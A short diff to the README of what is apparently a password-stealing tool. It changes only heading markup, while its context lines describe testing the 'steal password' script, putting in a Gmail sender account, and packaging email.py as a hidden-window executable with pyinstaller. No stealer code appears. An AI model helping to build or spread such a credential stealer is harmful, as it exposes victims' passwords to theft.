@@ -14,7 +14,7 @@ https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe
 
  after install Python
  
- # simple installation dependances :
+ **simple installation dependances :
  
  test steal password with local script
  
@@ -31,7 +31,7 @@ put your gmail email (and password ), email sender
 
 run  build_email.bat
  
- # Manuel installation
+**Manuel installation
  
  open your cmd and install Dependencies
 
@@ -50,7 +50,7 @@ pip install pyinstaller
 
 pyinstaller email.py -F -w
 
-# demo Video Youtube ( video deleted )
+**demo Video Youtube ( video deleted )
 
 https://www.youtube.com/watch?v=EGkzVcd26I8&feature=youtu.be
 
